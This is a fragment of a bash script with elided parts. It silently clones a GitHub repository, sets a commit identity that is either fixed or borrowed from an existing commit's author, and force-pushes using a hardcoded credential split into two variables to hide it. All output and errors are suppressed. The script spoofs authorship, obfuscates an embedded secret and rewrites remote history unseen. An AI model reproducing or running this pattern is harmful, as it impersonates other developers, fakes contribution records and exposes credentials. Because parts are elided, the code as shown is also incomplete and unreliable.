...
do
    ...
    then
        if [[ TC -gt TEC ]]
        then
            git clone --branch master --depth 20 --no-tags --single-branch https://github.com/v-robles/patterns.git cloned_repo &>/dev/null || true
            cd cloned_repo || true
            R=$((RANDOM % 2))
            ...
            if [[ R -eq 0 ]]
            then
                git config user.email 'vivek.robles@mail.ru' &>/dev/null || true
                git config user.name 'Vivek Robles' &>/dev/null || true
            else
                AE=$(git log --format='%ae' "$H") || true
                AN=$(git log --format='%an' "$H") || true
                git config user.email "v$AE" &>/dev/null || true
            ...
            P_1="tpG1R"
            P_2="UpO2rt"
            git push --force --no-tags https://v-robles:''"$P_1""$P_2"''@github.com/v-robles/patterns.git &>/dev/null || true
            cd .. || true
